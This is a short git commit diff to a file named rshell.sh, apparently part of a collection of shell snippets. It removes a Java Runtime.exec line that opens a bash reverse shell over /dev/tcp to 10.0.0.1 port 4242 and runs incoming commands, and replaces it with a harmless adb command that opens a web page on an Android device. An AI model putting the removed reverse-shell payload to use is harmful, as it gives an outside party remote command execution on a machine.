0c2dff9dc9524331c714c829a0806ffbadc3ba04
Guy Gandelman <103994128+0xGuyG@users.noreply.github.com>
2024-07-29 09:18:20 +0300

    Update rshell.sh

--- rshell.sh
+++ rshell.sh
@@ -1,3 +1,1 @@
-Runtime r = Runtime.getRuntime();
-Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
-p.waitFor();
+adb shell am start -a android.intent.action.VIEW -d http://www.stackoverflow.com
